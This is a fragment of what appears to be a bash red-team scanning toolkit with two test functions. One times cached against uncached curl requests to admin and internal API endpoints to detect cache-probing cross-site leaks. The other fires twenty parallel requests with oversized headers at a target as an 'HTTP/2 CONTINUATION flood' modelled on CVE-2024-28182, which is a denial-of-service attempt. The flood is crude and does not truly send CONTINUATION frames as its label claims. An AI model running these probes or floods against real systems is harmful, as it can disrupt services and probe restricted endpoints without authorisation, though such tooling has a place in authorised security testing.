rt_141_cache_probing_attack() {
    local target="${1:-$TARGET}"
    _section "[RT-141] CACHE PROBING XS-LEAK"
    run "Testing for cache-based cross-site leaks..."
    > "$SESSION/rt/cache_probe.txt"
    local ENDPOINTS=("/api/user" "/api/admin" "/admin" "/api/internal")
    for ep in "${ENDPOINTS[@]}"; do
        # Prime the cache
        curl -sk --max-time 5 \
            -H "User-Agent: $UA" \
            -H "Cookie: session=test123" \
            "https://$TARGET${ep}" 2>/dev/null >/dev/null
        # Measure timing with cache
        local start=$(date +%s%N)
        curl -sk --max-time 5 \
            -H "User-Agent: $UA" \
            -H "Cookie: session=test123" \
            "https://$TARGET${ep}" 2>/dev/null >/dev/null
        local cached=$(( ($(date +%s%N) - start) / 1000000 ))
        # Measure timing without cache
        start=$(date +%s%N)
        curl -sk --max-time 5 \
            -H "User-Agent: Mozilla/5.0 (different)" \
            "https://$TARGET${ep}?cachebust=$RANDOM" 2>/dev/null >/dev/null
        local uncached=$(( ($(date +%s%N) - start) / 1000000 ))
        local diff=$((uncached - cached))
        [ "$diff" -gt 50 ] && {
            echo "CACHE PROBE: $ep -> cached:${cached}ms vs uncached:${uncached}ms (diff:${diff}ms)" >> "$SESSION/rt/cache_probe.txt"
            rt "Cache probing XS-Leak at $ep!"
        }
    done
    [ -s "$SESSION/rt/cache_probe.txt" ] || info "No cache probing vectors"
}

rt_142_http2_continuation_flood() {
    local target="${1:-$TARGET}"
    _section "[RT-142] HTTP/2 CONTINUATION FLOOD (CVE-2024-28182-style)"
    run "Testing HTTP/2 CONTINUATION frame flooding..."
    > "$SESSION/rt/http2_continuation.txt"
    local host=$(echo "$target" | sed 's|https\?://||' | cut -d/ -f1)
    # Check HTTP/2 support
    local h2=$(curl -sk --http2 --max-time 8 \
        -w "\nPROTOCOL:%{http_version}" \
        -H "User-Agent: $UA" \
        -o /dev/null \
        "https://$TARGET/" 2>/dev/null)
    echo "$h2" | grep -q 'PROTOCOL:2' && {
        echo "HTTP/2 supported on $host" >> "$SESSION/rt/http2_continuation.txt"
        # Send rapid HEADERS + CONTINUATION frames
        for i in $(seq 1 20); do
            (
                curl -sk --http2 -X HEAD --max-time 3 \
                    -H ":method: GET" \
                    -H ":scheme: https" \
                    -H ":authority: ${host}" \
                    -H ":path: /" \
                    -H "x-flood-header-$i: A$(python3 -c "print('A'*4000)" 2>/dev/null || printf '%0.sA' $(seq 1 4000))" \
                    "https://$TARGET/" 2>/dev/null &
                sleep 0.05
                kill $! 2>/dev/null
            ) &
        done
        wait 2>/dev/null
        echo "CONTINUATION FLOOD: 20 flood frames sent to $host" >> "$SESSION/rt/http2_continuation.txt"
    }
    [ -s "$SESSION/rt/http2_continuation.txt" ] || info "HTTP/2 not supported or no flood vector"
}

